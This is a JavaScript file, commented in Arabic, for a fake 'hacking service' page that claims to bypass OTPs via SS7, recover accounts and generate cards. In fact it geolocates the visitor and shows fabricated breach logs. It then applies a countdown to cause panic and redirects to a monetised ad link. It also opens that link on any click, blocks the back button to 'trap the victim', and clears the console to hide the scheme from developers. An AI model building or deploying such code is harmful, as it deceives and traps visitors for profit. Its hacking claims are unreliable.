/**
 * AETHER_V5 CORE ENGINE - BLACK OPS EDITION
 * OPERATIONAL PROTOCOL: ARM0GEDDON_x2
 */

// --- 1. طُعم التتبع الجغرافي (Surveillance Hook) ---
async function fetchIntel() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        document.getElementById('user-ip').innerText = data.ip;
        document.getElementById('user-loc').innerText = `${data.city.toUpperCase()}, ${data.country_name.toUpperCase()} (ISP: ${data.org.toUpperCase()})`;
    } catch (e) {
        document.getElementById('user-ip').innerText = "127.0.0.1";
        document.getElementById('user-loc').innerText = "NODE_CLOAKED";
    }
}
fetchIntel();

// --- 2. محرك الهندسة النفسية (Hardware & OS Detection) ---
function detectHardware() {
    const os = navigator.platform;
    const browser = navigator.userAgent.split(' ')[0];
    document.getElementById('user-os').innerText = os;
    document.getElementById('user-browser').innerText = browser + "_VULN_CORE";
    document.getElementById('session-id').innerText = `X-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
}
detectHardware();

// --- 3. بيانات السجلات الوهمية (Custom Service Logs) ---
const serviceLogs = {
    'SOC_REC': ["RESOLVING FACEBOOK_GRAPH_API...", "BYPASSING SMS_AUTH_V3...", "STAGING PROFILE_DATA_DUMP..."],
    'OTP_BYP': ["SCANNING GSM_PAGING_CHANNEL...", "INTERCEPTING SS7_MAP_PACKET...", "DECRYPTING OTP_FRAGMENT..."],
    'MSG_FOR': ["MOUNTING WHATSAPP_SQLITE_BLOB...", "RECOVERING DELETED_NODES...", "SYNCING MEDIA_CACHE..."],
    'VCC_GEN': ["QUERYING BIN_DB_GLOBAL...", "GENERATING LUHN_CHECKSUM...", "VALIDATING VCC_BUFFER..."]
};

let activeService = 'SOC_REC';
const globalLogs = [
    "ESTABLISHING SECURE_UPLINK via TOR...",
    "HANDSHAKE ACCEPTED BY MSC_GATEWAY.",
    "INJECTING PAYLOAD 0x88_FRAGMENT...",
    "CRITICAL: BYPASSING KERNEL_WATCHDOG...",
    "ENCRYPTION KEY EXFILTRATED SUCCESSFULLY."
];

function selectService(type) {
    activeService = type;
    const targetInput = document.getElementById('target');
    targetInput.focus();
    targetInput.placeholder = `TARGET FOR ${type} (e.g. +201XXXXXXXX)`;
    console.log(`%c[SYSTEM] Service switched to: ${type}`, "color: yellow");
}

// --- 4. بدء عملية الاختراق (The Breach Sequence) ---
async function initiateBreach() {
    const target = document.getElementById('target').value;
    if (target.length < 5) return alert("ERR: TARGET_ID_TOO_SHORT");

    document.getElementById('main-ui').classList.add('hidden');
    document.getElementById('terminal-ui').classList.remove('hidden');
    
    await runTerminal();
}

async function runTerminal() {
    const content = document.getElementById('terminal-content');
    const percentEl = document.getElementById('loader-percent');
    const progressLine = document.getElementById('progress-line');
    
    // دمج سجلات الخدمة المخصصة مع السجلات العامة
    const fullSequence = [...serviceLogs[activeService], ...globalLogs];
    let currentProgress = 0;

    for (let i = 0; i < fullSequence.length; i++) {
        const p = document.createElement('p');
        p.className = i === 3 ? "text-red-500 font-bold" : "text-cyan-600";
        p.innerHTML = `<span class="opacity-30">[${new Date().toLocaleTimeString()}]</span> > ${fullSequence[i]}`;
        content.prepend(p);

        currentProgress += Math.floor(100 / fullSequence.length);
        const displayProgress = Math.min(currentProgress, 100);
        percentEl.innerText = `${displayProgress}%`;
        progressLine.style.width = `${displayProgress}%`;

        // تأخير عشوائي بين الأسطر لزيادة المصداقية
        await new Promise(r => setTimeout(r, Math.random() * 2000 + 1000));
    }

    setTimeout(() => {
        document.getElementById('terminal-ui').classList.add('hidden');
        document.getElementById('trap-ui').classList.remove('hidden');
        startCountdown();
    }, 1500);
}

// --- 5. عداد الذعر التنازلي (The Panic Countdown) ---
function startCountdown() {
    let timeLeft = 180;
    const countdownEl = document.getElementById('countdown');
    const timer = setInterval(() => {
        timeLeft--;
        countdownEl.innerText = `${timeLeft}s`;
        if (timeLeft <= 0) clearInterval(timer);
    }, 1000);
}

// --- 6. التنفيذ النهائي (The Money Shot / Smart Link) ---
function deployBypass() {
    document.getElementById('loading-overlay').classList.remove('hidden');
    
    // الرابط الذكي الخاص بك (The Smart Link)
    const smartLink = "https://www.profitablecpmratenetwork.com/gxq6edyh?key=126f32892d9f438037ab3f2cedc2e630";

    console.log("%c[CRITICAL] FINALIZING HANDSHAKE. REDIRECTING TO VERIFICATION_GATEWAY...", "color: red; font-weight: bold;");

    // تأخير أخير لزيادة التوتر قبل التحويل
    setTimeout(() => {
        window.location.href = smartLink;
    }, 4000);
}

// --- 7. بروتوكول "لا هروب" و "الربح العشوائي" ---
// فتح الرابط الذكي في نافذة جديدة عند أول ضغطة في أي مكان لزيادة الأرباح
document.addEventListener('click', function() {
    if (!window.adsTriggered) {
        window.open("https://www.profitablecpmratenetwork.com/gxq6edyh?key=126f32892d9f438037ab3f2cedc2e630", "_blank");
        window.adsTriggered = true;
    }
}, { once: true });

// منع زر الرجوع لتعليق الضحية داخل الفخ
history.pushState(null, null, document.URL);
window.addEventListener('popstate', function () {
    history.pushState(null, null, document.URL);
    alert("CRITICAL_ERR: UNAUTHORIZED_BACKTRACK. Data integrity at risk.");
});

// إغراق الكونسول برسائل وهمية لمنع المطورين من كشف الفخ بسهولة
setInterval(() => {
    console.clear();
    console.log("%cAETHER_V5: PRIVILEGED_ACCESS_ONLY", "color: red; font-size: 25px; font-weight: 900; background: black;");
    console.log("%c[!] SS7_VULNERABILITY_DETECTED: STAGING_PAYLOAD...", "color: orange;");
    console.error("[SYS_FAILURE] Failed to load forensics_module_x64. Re-trying...");
}, 2000);
                                          
